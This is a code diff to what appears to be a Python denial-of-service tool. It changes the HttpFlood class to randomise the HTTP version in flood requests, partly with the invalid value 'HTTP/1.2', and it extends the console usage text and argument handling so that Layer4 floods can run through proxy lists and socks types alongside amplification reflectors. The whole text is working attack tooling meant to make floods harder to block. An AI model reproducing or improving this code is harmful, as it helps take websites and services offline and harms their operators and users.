@@ -387,8 +387,8 @@ class HttpFlood(Thread):
             ]
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
-        self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type,
-                                                       target.raw_path_qs)
+        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
+                                                       target.raw_path_qs,randchoice(['1.0','1.1','1.2']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -1096,8 +1096,8 @@ class ToolsConsole:
             'Note: If the Proxy list is empty, the attack will run without proxies\n'
             '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
             '      Proxy Type 0 = All in config.json\n'
-            ' Layer7: python3 %s <method> <url> <socks_type5.4.1> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
-            ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with '
+            ' Layer7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
+            ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <proxylist> <socks_type> <reflector file (only use with '
             'Amplification)>\n'
             '\n'
             ' > Methods:\n'
@@ -1113,7 +1113,7 @@ class ToolsConsole:
             '\n'
             'Example:\n'
             '    Layer7: python3 %s %s %s %s %s proxy.txt %s %s\n'
-            '    Layer4: python3 %s %s %s %s %s proxy.txt') %
+            '    Layer4: python3 %s %s %s %s %s proxy.txt %s') %
               (argv[0], argv[0], ", ".join(Methods.LAYER4_METHODS),
                len(Methods.LAYER4_METHODS), ", ".join(Methods.LAYER7_METHODS),
                len(Methods.LAYER7_METHODS), ", ".join(ToolsConsole.METHODS),
@@ -1123,7 +1123,7 @@ class ToolsConsole:
                "https://example.com", randchoice([4, 5, 1, 0]),
                randint(850, 1000), randint(50, 100), randint(
                    1000, 3600), argv[0], randchoice([*Methods.LAYER4_METHODS]),
-               "8.8.8.8:80", randint(850, 1000), randint(1000, 3600)))
+               "8.8.8.8:80", randint(850, 1000), randint(1000, 3600), randchoice([4, 5, 1, 0])))
 
     @staticmethod
     def ts_srv(domain):
@@ -1298,7 +1298,7 @@ if __name__ == '__main__':
                                           refl_li.open("r+").read()))
                         if not ref: exit("Empty Reflector File ")
                     else:
-                        if len(argv) == 6:
+                        if len(argv) == 7:
                             logger.setLevel("DEBUG")
 
                     proxies = get_proxies(proxy_li)
